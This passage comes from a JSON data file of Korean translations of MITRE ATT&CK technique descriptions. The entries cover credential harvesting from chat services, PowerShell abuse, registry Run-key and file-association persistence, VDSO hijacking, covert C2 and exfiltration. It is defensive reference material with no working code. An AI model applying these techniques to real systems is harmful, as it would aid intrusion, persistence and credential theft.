    "description": "적대자는 사용자 커뮤니케이션 서비스에 저장되거나 전달되는 보안이 취약한 자격 증명을 직접 수집할 수 있습니다. 자격 증명은 이메일, Slack이나 Teams와 같은 채팅 서비스, Jira나 Trello와 같은 협업 도구 및 사용자 커뮤니케이션을 지원하는 기타 서비스와 같은 사용자 채팅 커뮤니케이션 애플리케이션에서 전송되고 저장될 수 있습니다. 사용자는 사적 또는 공적 기업 내부 커뮤니케이션 채널에서 사용자 이름 및 비밀번호, API 키 또는 인증 토큰과 같은 다양한 형태의 자격 증명을 공유할 수 있습니다.\n\n저장된 채팅 로그에 접근하는 대신, 적대자는 사용자 엔드포인트에서 이러한 서비스 내의 자격 증명에 직접 접근하거나, 서비스를 호스팅하는 서버를 통해, 또는 클라우드 호스팅 서비스의 관리자 포털을 통해 접근할 수 있습니다. 또한, 적대자는 Slack 워크플로우와 같은 통합 도구를 손상시켜 메시지를 자동으로 검색하여 사용자 자격 증명을 추출할 수 있습니다. 이러한 자격 증명은 이후 수평 이동이나 권한 상승과 같은 후속 활동을 수행하는 데 악용될 수 있습니다.",
    "external_id": "T1552.008",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "PowerShell",
    "description": "적대자들은 실행을 위해 PowerShell 명령어와 스크립트를 악용할 수 있습니다. PowerShell은 Windows 운영 체제에 포함된 강력한 대화형 명령줄 인터페이스 및 스크립팅 환경입니다. 적대자들은 정보 검색 및 코드 실행을 포함한 여러 작업을 수행하기 위해 PowerShell을 사용할 수 있습니다. 예를 들어, 실행 파일을 실행하는 데 사용될 수 있는 `Start-Process` cmdlet과 로컬 또는 원격 컴퓨터에서 명령을 실행하는 `Invoke-Command` cmdlet이 있습니다(원격 시스템에 연결하기 위해 PowerShell을 사용하려면 관리자 권한이 필요함).\n\nPowerShell은 또한 인터넷에서 실행 파일을 다운로드하고 실행하는 데 사용될 수 있으며, 이는 디스크를 거치지 않고 메모리에서 실행될 수 있습니다.\n\n여러 PowerShell 기반 공격 테스트 도구가 있으며, 여기에는 Empire, PowerSploit, PoshC2 및 PSAttack이 포함됩니다.\n\nPowerShell 명령어/스크립트는 .NET 프레임워크 및 Windows 공용 언어 인터페이스(CLI)를 통해 노출된 PowerShell의 기본 `System.Management.Automation` 어셈블리 DLL에 대한 인터페이스를 통해 `powershell.exe` 바이너리를 직접 호출하지 않고도 실행될 수 있습니다.",
    "external_id": "T1059.001",
    "modified": "2024-10-15T16:39:13.228Z",
    "translated": true
  },
  {
    "title": "Change Default File Association",
    "description": "적대자는 파일 유형 연관으로 인해 유해한 콘텐츠를 실행하여 지속성을 유지할 수 있습니다. 파일을 열면 파일을 여는 데 사용되는 기본 프로그램(파일 연관 또는 핸들러라고도 함)이 확인됩니다. 파일 연관 선택은 Windows 레지스트리에 저장되며, 레지스트리 접근이 가능한 사용자, 관리자 또는 프로그램에 의해 편집되거나 내장된 assoc 유틸리티를 사용하는 관리자가 편집할 수 있습니다. 응용 프로그램은 주어진 파일 확장자에 대한 파일 연관을 수정하여 해당 확장자를 가진 파일이 열릴 때 임의의 프로그램을 호출하도록 할 수 있습니다.\n\n시스템 파일 연관은 <code>HKEY_CLASSES_ROOT\\.[extension]</code> 아래에 나열됩니다. 예를 들어, <code>HKEY_CLASSES_ROOT\\.txt</code>와 같습니다. 항목은 <code>HKEY_CLASSES_ROOT\\\\[handler]</code>에 위치한 해당 확장자의 핸들러를 가리킵니다. 다양한 명령은 <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code> 아래의 하위 키로 나열됩니다. 예를 들어:\n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\n나열된 키의 값은 핸들러가 파일 확장자를 열 때 실행되는 명령입니다. 적대자는 이러한 값을 수정하여 임의의 명령을 지속적으로 실행할 수 있습니다.",
    "external_id": "T1546.001",
    "modified": "2024-09-12T15:27:11.065Z",
    "translated": true
  },
  {
    "title": "VDSO Hijacking",
    "description": "적대자는 프로세스 기반 방어를 회피하고 권한을 상승시킬 수 있는 방법으로 VDSO 하이재킹을 통해 프로세스에 악성 코드를 주입할 수 있습니다. 가상 동적 공유 객체(VDSO) 하이재킹은 별도의 활성 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nVDSO 하이재킹은 동적으로 연결된 공유 라이브러리에 대한 호출을 리디렉션하는 것입니다. 메모리 보호는 실행 가능한 코드를 프로세스에 쓰는 것을 방지할 수 있습니다. 그러나 공격자는 VDSO 공유 객체에서 프로세스에 매핑된 시스템 호출 인터페이스 코드 스텁을 하이재킹하여 악성 공유 객체를 열고 매핑하기 위해 시스템 호출을 실행할 수 있습니다. 이 코드는 프로세스의 전역 오프셋 테이블에 저장된 패치된 메모리 주소 참조를 통해 프로세스의 실행 흐름을 리디렉션하여 호출될 수 있습니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하는 것은 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있게 하며, 가능하다면 권한 상승도 이루어질 수 있습니다. VDSO 하이재킹을 통한 실행은 실행이 정당한 프로세스 아래에서 가려지기 때문에 보안 제품의 탐지를 회피할 수도 있습니다.",
    "external_id": "T1055.014",
    "modified": "2022-07-07T17:09:09.048Z",
    "translated": true
  },
  {
    "title": "File Transfer Protocols",
    "description": "적대자들은 파일 전송과 관련된 응용 프로토콜을 사용하여 탐지나 네트워크 필터링을 피하고 기존 트래픽에 섞여 들어갈 수 있습니다. 원격 시스템에 대한 명령과 종종 이러한 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 포함됩니다.\n\nSMB, FTP, FTPS 및 TFTP와 같은 파일 전송 프로토콜은 환경 내에서 매우 흔하게 사용될 수 있습니다. 이러한 프로토콜에서 생성된 패킷은 데이터를 숨길 수 있는 많은 필드와 헤더를 포함할 수 있습니다. 데이터는 전송되는 파일 내에서도 숨겨질 수 있습니다. 적대자는 이러한 프로토콜을 악용하여 피해자 네트워크 내에서 자신이 제어하는 시스템과 통신하며 정상적이고 예상되는 트래픽을모방할 수 있습니다.",
    "external_id": "T1071.002",
    "modified": "2024-01-18T17:23:22.591Z",
    "translated": true
  },
  {
    "title": "Exploitation for Credential Access",
    "description": "적대자는 자격 증명을 수집하기 위해 소프트웨어 취약점을 악용할 수 있습니다. 소프트웨어 취약점의 악용은 적대자가 프로그램, 서비스 또는 운영 체제 소프트웨어나 커널 내의 프로그래밍 오류를 이용해 적대자가 제어하는 코드를 실행할 때 발생합니다.\n\n자격 증명 및 인증 메커니즘은 유용한 자격 증명에 접근하거나 시스템에 인증된 접근을 얻기 위한 과정을 우회하기 위해 적대자가 악용할 잠재적 대상이 될 수 있습니다. 한 예로, Kerberos를 타겟으로 하며 도메인 사용자 권한을 이용해 Kerberos 티켓을 위조할 수 있는 방법이 있습니다. 또 다른 예로는 적대자가 당사자 간 전송된 데이터 패킷을 가로채고 나중에 이러한 패킷을 재전송하는 재생 공격이 있습니다. 서비스가 인증 요청을 제대로 검증하지 않으면, 이러한 재전송된 패킷은 적대자가 당사자 중 하나를 가장하고 비인가된 접근이나 권한을 얻을 수 있게 할 수 있습니다.\n\n이러한 악용은 클라우드 환경에서도 입증되었습니다. 예를 들어, 적대자는 공용 클라우드 인프라의 취약점을 악용해 의도하지 않은 인증 토큰 생성 및 갱신을 가능하게 했습니다.\n\n자격 증명 접근을 위한 악용은 대상 프로세스나 획득한 자격 증명에 따라 특권 상승으로 이어질 수도 있습니다.",
    "external_id": "T1212",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Emond",
    "description": "적대자들은 이벤트 모니터 데몬(emond)이 유발하는 악성 콘텐츠를 실행함으로써 지속성을 확보하고 권한을 상승시킬 수 있습니다. Emond는 다양한 서비스로부터 이벤트를 받아 간단한 규칙 엔진을 통해 실행하고 조치를 취하는 시작 데몬입니다. <code>/sbin/emond</code>에 있는 emond 바이너리는 <code>/etc/emond.d/rules/</code> 디렉토리에서 규칙을 로드하고 명시적으로 정의된 이벤트가 발생하면 조치를 취합니다.\n\n규칙 파일은 plist 형식으로 작성되며 이름, 이벤트 유형 및 수행할 조치를 정의합니다. 이벤트 유형의 예로는 시스템 시작 및 사용자 인증이 있습니다. 조치의 예로는 시스템 명령 실행 또는 이메일 전송이 있습니다. emond 서비스는 <code>/private/var/db/emondClients</code> 경로에 파일이 없으면 시작되지 않으며, 이 경로는 <code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>에 있는 시작 데몬 구성 파일에 지정되어 있습니다.\n\n적대자들은 정의된 이벤트가 발생할 때 명령을 실행하도록 규칙을 작성함으로써 이 서비스를 악용할 수 있습니다. 이러한 이벤트에는 시스템 시작 또는 사용자 인증 등이 포함될 수 있습니다. 또한 emond 서비스는 루트 권한으로 실행되기 때문에, 적대자들은 관리자 권한에서 루트 권한으로 상승할 수 있는 가능성도 있습니다.",
    "external_id": "T1546.014",
    "modified": "2022-04-20T00:16:01.732Z",
    "translated": true
  },
  {
    "title": "One-Way Communication",
    "description": "적대자는 기존의 합법적인 외부 웹 서비스를 이용하여 침해된 시스템에 명령을 전송할 수 있으며, 이 때 웹 서비스 채널을 통한 결과 출력을 받지 않을 수 있다. 침해된 시스템은 인기 있는 웹사이트와 소셜 미디어를 활용하여 지휘 및 통제(C2) 지침을 호스팅할 수 있다. 감염된 시스템은 이러한 명령의 출력을 다른 C2 채널, 즉 또 다른 특정 웹 서비스로 전송할 수 있다. 또는 적대자가 시스템에 지침을 전송하고 응답을 원하지 않는 경우에는 침해된 시스템이 전혀 출력을 반환하지 않을 수도 있다.\n\nC2의 메커니즘으로 작용하는 인기 웹사이트와 소셜 미디어는 네트워크 내에서 호스트가 이미 이들과 통신하고 있을 가능성으로 인해 상당한 은폐를 제공할 수 있다. 구글이나 트위터와 같은 일반적인 서비스를 이용하면 적대자가 예상되는 잡음 속에 숨기 쉬워진다. 웹 서비스 제공업체는 일반적으로 SSL/TLS 암호화를 사용하기 때문에 적대자에게 추가적인 보호 수준을 제공한다.",
    "external_id": "T1102.003",
    "modified": "2020-03-26T23:26:10.109Z",
    "translated": true
  },
  {
    "title": "Gather Victim Network Information",
    "description": "적대자는 목표 설정에 사용할 수 있는 피해자의 네트워크에 대한 정보를 수집할 수 있습니다. 네트워크에 대한 정보에는 관리 데이터(예: IP 범위, 도메인 이름 등)와 토폴로지 및 운영에 관한 세부사항이 포함될 수 있습니다.\n\n적대자는 이러한 정보를 여러 가지 방법으로 수집할 수 있습니다. 예를 들어, 직접적인 수집 행동이나 피싱을 통해 정보를 수집할 수 있습니다. 네트워크에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다. 이러한 정보를 수집하면 다른 형태의 정찰(예: 능동 스캔 또는 공개 웹사이트/도메인 검색), 운영 자원 확립(예: 인프라 획득 또는 인프라 타협), 또는 초기 접근(예: 신뢰 관계 수립) 기회를 밝힐 수 있습니다.",
    "external_id": "T1590",
    "modified": "2021-04-15T03:34:23.229Z",
    "translated": true
  },
  {
    "title": "Exploitation of Remote Services",
    "description": "적대자는 네트워크 내부 시스템에 무단으로 접근하기 위해 원격 서비스를 악용할 수 있습니다. 소프트웨어 취약점의 악용은 적대자가 프로그램, 서비스 또는 운영 체제 소프트웨어나 커널 내의 프로그래밍 오류를 이용해 자신이 제어하는 코드를 실행할 때 발생합니다. 원격 서비스의 후속 악용을 위한 일반적인 목표는 측면 이동을 통해 원격 시스템에 접근하는 것입니다.\n\n적대자는 원격 시스템이 취약한 상태인지 확인해야 할 필요가 있을 수 있으며, 이는 네트워크에 배포된 일반적인 취약한 소프트웨어를 찾기 위한 네트워크 서비스 검색 또는 다른 발견 방법을 통해 수행될 수 있습니다. 특정 패치의 부족은 취약점을 나타낼 수 있으며, 원격 악용을 탐지하거나 차단하는 데 사용될 수 있는 보안 소프트웨어가 있을 수 있습니다. 서버는 측면 이동 악용을 위한 높은 가치의 목표일 가능성이 높지만, 엔드포인트 시스템도 추가 자원에 대한 접근이나 이점을 제공할 경우 위험에 처할 수 있습니다.\n\nSMB 및 RDP와 같은 일반 서비스에서 존재하는 몇 가지 잘 알려진 취약점이 있으며, 내부 네트워크에서 사용될 수 있는 MySQL과 웹 서버 서비스에서도 발견됩니다.\n\n취약한 원격 서비스의 권한 수준에 따라 적대자는 측면 이동 악용의 결과로 권한 상승을 위한 악용을 달성할 수 있습니다.",
    "external_id": "T1210",
    "modified": "2022-02-24T15:06:46.006Z",
    "translated": true
  },
  {
    "title": "Internal Spearphishing",
    "description": "적들이 환경 내 계정이나 시스템에 이미 접근한 후에는 내부 스피어피싱을 사용하여 추가 정보를 얻거나 동일 조직 내 다른 사용자들을 타겟으로 삼을 수 있습니다. 내부 스피어피싱은 초기에는 사용자의 장치를 제어하거나 사용자의 계정 자격 증명을 해킹하여 합법적인 계정을 타겟으로 하는 다단계 캠페인입니다. 이후 적들은 신뢰할 수 있는 내부 계정을 악용하여 더 많은 피해자를 속여 피싱 시도를 하게 만들 가능성을 높이려 할 수 있으며, 종종 위장 기법을 통합합니다.\n\n적들은 내부 스피어피싱의 일환으로 악성 페이로드를 전달하거나 사용자를 외부 사이트로 리디렉션하여 로그인 인터페이스를 모방한 사이트에서 자격 증명을 포획하기 위해 스피어피싱 첨부파일이나 스피어피싱 링크를 활용할 수 있습니다.\n\n또한 적들은 Microsoft Teams와 같은 내부 채팅 앱을 활용하여 악성 콘텐츠를 퍼뜨리거나 사용자와 상호작용하여 민감한 정보 및 자격 증명을 포착하려고 할 수 있습니다.",
    "external_id": "T1534",
    "modified": "2024-10-15T15:59:36.741Z",
    "translated": true
  },
  {
    "title": "Services File Permissions Weakness",
    "description": "적대자는 서비스를 위해 사용되는 바이너리를 가로채어 자신들의 악성 페이로드를 실행할 수 있습니다. 그들은 Windows 서비스의 권한에 있는 결함을 이용해 서비스 시작 시 실행되는 바이너리를 교체할 수 있습니다. 이러한 서비스 프로세스는 기능의 일환으로 특정 바이너리를 자동으로 실행하거나 다른 작업을 수행할 수 있습니다. 만약 대상 바이너리를 포함하는 파일 시스템 디렉토리의 권한이나 바이너리 자체의 권한이 부적절하게 설정되어 있다면, 대상 바이너리는 사용자 수준의 권한으로 다른 바이너리로 덮어쓰기되고 원래 프로세스에 의해 실행될 수 있습니다. 원래 프로세스와 스레드가 더 높은 권한 수준에서 실행 중이라면, 교체된 바이너리도 높은 수준의 권한에서 실행될 것이며, 여기에는 SYSTEM 권한이 포함될 수 있습니다.\n\n적대자는 이 기술을 사용하여 합법적인 바이너리를 악성 바이너리로 교체함으로써 더 높은 권한 수준에서 코드를 실행할 수 있습니다. 만약 실행되는 프로세스가 특정 시간에 실행되거나 특정 이벤트(예: 시스템 부팅) 동안 실행되도록 설정되어 있다면, 이 기술은 지속성에도 사용될 수 있습니다.",
    "external_id": "T1574.010",
    "modified": "2023-03-30T21:01:37.026Z",
    "translated": true
  },
  {
    "title": "Registry Run Keys / Startup Folder",
    "description": "적대자는 프로그램을 시작 폴더에 추가하거나 레지스트리 실행 키를 참조함으로써 지속성을 유지할 수 있습니다. 레지스트리의 \"실행 키\"에 항목을 추가하거나 시작 폴더에 추가하면 사용자가 로그인할 때 참조된 프로그램이 실행됩니다. 이러한 프로그램은 사용자의 컨텍스트에서 실행되며, 해당 계정과 관련된 권한 수준을 가집니다.\n\nWindows 시스템에서 기본적으로 생성되는 실행 키는 다음과 같습니다:\n\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\n실행 키는 여러 하이브 아래에 존재할 수 있습니다. HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx도 사용 가능하지만 Windows Vista 및 이후 버전에서는 기본적으로 생성되지 않습니다. 레지스트리 실행 키 항목은 프로그램을 직접 참조하거나 종속 항목으로 나열할 수 있습니다. 예를 들어, \"Depend\" 키를 사용하여 로그온 시 DLL을 로드하는 것이 가능합니다.\n\n프로그램을 시작 폴더에 배치하면 사용자가 로그인할 때 해당 프로그램도 실행됩니다. 개별 사용자 계정에 대한 시작 폴더 위치와 모든 사용자에 대한 시스템 전역 시작 폴더가 있으며, 로그인된 사용자 계정에 관계없이 확인됩니다. 현재 사용자의 시작 폴더 경로는 C:\\Users\\[사용자 이름]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup입니다. 모든 사용자의 시작 폴더 경로는 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp입니다.\n\n지속성을 위한 시작 폴더 항목을 설정하는 데 사용할 수 있는 레지스트리 키는 다음과 같습니다:\n\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\n부팅 중 서비스의 자동 시작을 제어할 수 있는 레지스트리 키는 다음과 같습니다:\n\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\n정책 설정을 사용하여 시작 프로그램을 지정하면 두 개의 레지스트리 키 중 하나에 해당 값이 생성됩니다:\n\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\n레지스트리 키 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows의 로드 값에 나열된 프로그램은 현재 로그인한 사용자에 대해 자동으로 실행됩니다.\n\n기본적으로 레지스트리 키 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager의 다중 문자열 BootExecute 값은 autocheck autochk *로 설정되어 있습니다. 이 값은 Windows가 부팅 시 시스템이 비정상적으로 종료된 경우 하드 디스크의 파일 시스템 무결성을 확인하도록 합니다. 적대자는 부팅 시 자동으로 시작될 다른 프로그램이나 프로세스를 이 레지스트리 값에 추가할 수 있습니다.\n\n적대자는 이러한 구성 위치를 사용하여 원격 액세스 도구와 같은 악성 코드를 실행하여 시스템 재부팅을 통해 지속성을 유지할 수 있습니다. 또한, 적대자는 레지스트리 항목을 합법적인 프로그램과 관련이 있는 것처럼 보이도록 위장할 수 있습니다.",
    "external_id": "T1547.001",
    "modified": "2024-09-12T15:27:58.051Z",
    "translated": true
  },
  {
    "title": "Trusted Relationship",
    "description": "적대자는 목표 피해자에게 접근할 수 있는 조직을 침해하거나 활용할 수 있습니다. 신뢰할 수 있는 제3자 관계를 통한 접근은 기존의 연결을 악용하며, 이는 네트워크에 접근하는 표준 메커니즘보다 보호받지 않거나 덜 면밀히 조사될 수 있습니다.\n\n조직은 종종 외부 공급자에게 내부 시스템 및 클라우드 기반 환경을 관리할 수 있도록 높은 접근 권한을 부여합니다. 이러한 관계의 예로는 IT 서비스 계약업체, 관리 보안 제공업체, 인프라 계약업체(예: 공조, 엘리베이터, 물리적 보안) 등이 있습니다. 제3자 공급자의 접근은 유지 관리되는 인프라로 제한될 의도가 있을 수 있지만, 나머지 기업과 동일한 네트워크에 존재할 수 있습니다. 따라서, 내부 네트워크 시스템에 접근하기 위해 다른 당사자가 사용하는 유효한 계정이 손상되어 악용될 수 있습니다.\n\nOffice 365 환경에서는 조직이 Microsoft 파트너나 리셀러에게 위임된 관리자 권한을 부여할 수 있습니다. 파트너나 리셀러 계정을 침해함으로써, 적대자는 기존의 위임된 관리자 관계를 활용하거나 새로운 위임된 관리자 제안을 클라이언트에게 전송하여 피해자 테넌트에 대한 관리 권한을 얻을 수 있습니다.",
    "external_id": "T1199",
    "modified": "2024-10-15T16:08:39.968Z",
    "translated": true
  },
  {
    "title": "Cloud Account",
    "description": "적대자는 피해 시스템에 대한 접근을 유지하기 위해 클라우드 계정을 생성할 수 있습니다. 충분한 수준의 접근 권한이 있을 경우, 이러한 계정은 시스템에 지속적인 원격 접근 도구를 배포할 필요 없이 보조 자격 증명 접근을 설정하는 데 사용될 수 있습니다.\n\n사용자 계정 외에도 클라우드 계정은 서비스와 연결될 수 있습니다. 클라우드 제공업체는 서비스 계정 개념을 다양한 방식으로 처리합니다. Azure에서는 서비스 계정이 서비스 주체와 관리되는 ID를 포함하며, 이는 OAuth 애플리케이션, 서버리스 함수 및 가상 머신과 같은 다양한 리소스에 연결되어 해당 리소스가 환경 내에서 다양한 활동을 수행할 수 있도록 권한을 부여합니다. GCP에서는 서비스 계정이 특정 리소스에 연결될 수 있으며, 다른 계정이 임시로 서비스 계정을 가장할 수 있습니다. AWS에는 서비스 계정의 특정 개념은 없지만, 리소스에 역할을 맡길 수 있는 권한을 직접 부여할 수 있습니다.\n\n적대자는 특정 클라우드 서비스에만 접근할 수 있는 계정을 생성하여 탐지 가능성을 줄일 수 있습니다.\n\n적대자가 클라우드 계정을 생성하면, 해당 계정을 조작하여 지속성을 보장하고 추가 리소스에 대한 접근을 허용할 수 있습니다. 예를 들어, 추가 클라우드 자격 증명을 추가하거나 추가 클라우드 역할을 할당함으로써 이를 수행할 수 있습니다.",
    "external_id": "T1136.003",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Local Groups",
    "description": "적대자는 로컬 시스템 그룹 및 권한 설정을 찾으려고 시도할 수 있습니다. 로컬 시스템 권한 그룹에 대한 지식은 적대자가 어떤 그룹이 존재하는지와 특정 그룹에 어떤 사용자가 속해 있는지를 판단하는 데 도움이 될 수 있습니다. 적대자는 이 정보를 사용하여 로컬 관리자 그룹에 있는 사용자를 포함하여 어떤 사용자에게 상승된 권한이 있는지 판단할 수 있습니다.\n\n명령어는 로컬 그룹을 나열하는 데 사용될 수 있습니다.",
    "external_id": "T1069.001",
    "modified": "2023-04-07T17:14:42.184Z",
    "translated": true
  },
  {
    "title": "Search Open Websites/Domains",
    "description": "적대자들은 목표에 사용할 수 있는 피해자에 대한 정보를 위해 자유롭게 접근 가능한 웹사이트와 도메인을 검색할 수 있습니다. 피해자에 대한 정보는 소셜 미디어, 뉴스 사이트 또는 채용이나 요청된/보상된 계약과 같은 비즈니스 운영에 대한 정보를 호스팅하는 사이트와 같은 다양한 온라인 사이트에서 이용 가능할 수 있습니다.\n\n적대자들은 수집하려는 정보에 따라 다양한 온라인 사이트를 검색할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 설정하거나 초기 접근을 확보하는 데 도움이 될 수 있습니다.",
    "external_id": "T1593",
    "modified": "2024-09-12T19:19:47.759Z",
    "translated": true
  },
  {
    "title": "Account Manipulation",
    "description": "적대세력은 피해 시스템에 대한 접근을 유지하거나 높이기 위해 계정을 조작할 수 있다. 계정 조작은 자격 증명이나 권한 그룹을 수정하는 등, 피험자 계정에 대한 적대세력의 접근을 유지하거나 수정하는 모든 행동을 포함할 수 있다. 이러한 행동은 또한 보안 정책을 무력화하기 위해 설계된 계정 활동을 포함할 수 있으며, 예를 들어 비밀번호 기간 정책을 우회하기 위해 반복적인 비밀번호 업데이트를 수행하고 손상된 자격 증명의 수명을 유지하는 경우가 있다.\n\n계정을 생성하거나 조작하기 위해서는 적대세력이 이미 시스템이나 도메인에서 충분한 권한을 가지고 있어야 한다. 그러나 계정 조작은 수정된 권한이 추가 역할, 권한 또는 더 높은 권한의 접근을 부여하는 권한 상승으로 이어질 수도 있다.",
    "external_id": "T1098",
    "modified": "2024-10-15T15:35:57.382Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Alternative Protocol",
    "description": "적대자는 기존의 명령 및 제어 채널과 다른 프로토콜을 통해 데이터를 외부로 유출할 수 있습니다. 데이터는 또한 주요 명령 및 제어 서버에서 대체 네트워크 위치로 전송될 수 있습니다.\n\n대체 프로토콜에는 FTP, SMTP, HTTP/S, DNS, SMB 또는 주요 명령 및 제어 채널로 사용되지 않는 다른 모든 네트워크 프로토콜이 포함됩니다. 적대자는 이러한 대체 채널을 암호화하고/또는 은닉할 수도 있습니다.\n\n대체 프로토콜을 통한 외부 유출은 다양한 일반 운영 체제 유틸리티를 사용하여 수행될 수 있습니다. MacOS 및 Linux에서는 HTTP/S 또는 FTP/S와 같은 프로토콜을 호출하여 시스템에서 데이터를 외부로 유출할 수 있습니다.\n\n많은 IaaS 및 SaaS 플랫폼(예: Microsoft Exchange, Microsoft SharePoint, GitHub 및 AWS S3)은 웹 콘솔이나 Cloud API를 통해 파일, 이메일, 소스 코드 및 기타 민감한 정보를 직접 다운로드하는 것을 지원합니다.",
    "external_id": "T1048",
    "modified": "2024-10-15T15:57:26.415Z",
    "translated": true
  },
  {
    "title": "Kernel Modules and Extensions",
    "description": "적대자는 시스템 부팅 시 프로그램을 자동으로 실행하기 위해 커널을 수정할 수 있습니다. 로드 가능한 커널 모듈(LKM)은 필요에 따라 커널에 로드되고 언로드될 수 있는 코드 조각입니다. 이들은 시스템을 재부팅할 필요 없이 커널의 기능을 확장합니다. 한 유형의 모듈은 장치 드라이버로, 커널이 시스템에 연결된 하드웨어에 접근할 수 있도록 합니다.\n\n악의적으로 사용될 경우, LKM은 가장 높은 운영 체제 권한(Ring 0)으로 실행되는 커널 모드 루트킷의 일종이 될 수 있습니다. LKM 기반 루트킷의 일반적인 특징에는 자기 숨김, 파일 및 프로세스, 네트워크 활동의 선택적 숨김, 로그 변조, 인증된 백도어 제공 및 비특권 사용자에 대한 루트 접근 허용이 포함됩니다.\n\n커널 확장으로도 불리는 kext는 macOS에서 시스템에 기능을 로드하는 데 사용되며, 이는 Linux의 LKM과 유사합니다. 커널이 보안을 시행하는 책임이 있으며 커널 확장이 커널의 일부분으로 실행되기 때문에, kext는 macOS 보안 정책의 적용을 받지 않습니다. Kext는 kextload 및 kextunload 명령어를 통해 로드 및 언로드됩니다. Kext는 Apple이 커널 확명서 서명에 대한 권한을 부여한 개발자 ID로 서명되어야 합니다. 이러한 권한이 없는 개발자는 kext에 서명할 수 있지만 SIP가 비활성화되지 않으면 로드되지 않습니다. SIP가 활성화된 경우 kext 서명은 AuxKC에 추가되기 전에 확인됩니다.\n\nmacOS Catalina 10.15부터 커널 확장은 시스템 확장을 지원하기 위해 더 이상 사용되지 않습니다. 그러나 커널 프로그래밍 인터페이스에 대한 시스템 확장이 없기 때문에 kext는 여전히 \"레거시 시스템 확장\"으로 허용됩니다.\n\n적대자는 시스템에서 지속성 및/또는 권한 상승을 수행하기 위해 LKM과 kext를 사용할 수 있습니다. 야생에서 발견된 예가 있으며 관련된 오픈 소스 프로젝트도 존재합니다.",
    "external_id": "T1547.006",
    "modified": "2024-09-12T17:30:54.170Z",
    "translated": true
  },
  {
    "title": "GUI Input Capture",
    "description": "적대자는 사용자에게 자격 증명을 요청하기 위해 일반적인 운영 체제 GUI 구성 요소를 모방할 수 있습니다. 추가 권한이 필요한 프로그램이 실행될 때, 현재 사용자 컨텍스트에 존재하는 권한보다 더 높은 권한을 승인하기 위해 운영 체제가 사용자에게 적절한 자격 증명을 요청하는 것이 일반적입니다.\n\n적대자는 이러한 기능을 모방하여 추가 접근이 필요한 가짜 설치 프로그램이나 가짜 악성 코드 제거 프로그램과 같이 정상적인 사용을 모방하는 여러 가지 이유로 사용자에게 자격 증명을 요청할 수 있습니다. 이러한 유형의 프롬프트는 다양한 언어를 통해 자격 증명을 수집하는 데 사용될 수 있습니다. 리눅스 시스템에서는 적대자가 악성 셸 스크립트나 명령줄에서 사용자에게 자격 증명을 요청하는 대화 상자를 실행할 수 있습니다.\n\n적대자는 또한 브라우저나 이메일 클라이언트와 같은 일반적인 소프트웨어 인증 요청을 모방할 수 있습니다. 이는 사용자가 민감한 사이트나 데이터에 자연스럽게 접근할 때 프롬프트를 속이기 위해 사용자 활동 모니터링과 결합될 수도 있습니다.",
    "external_id": "T1056.002",
    "modified": "2024-04-15T23:39:31.474Z",
    "translated": true
  },
  {
    "title": "Tool",
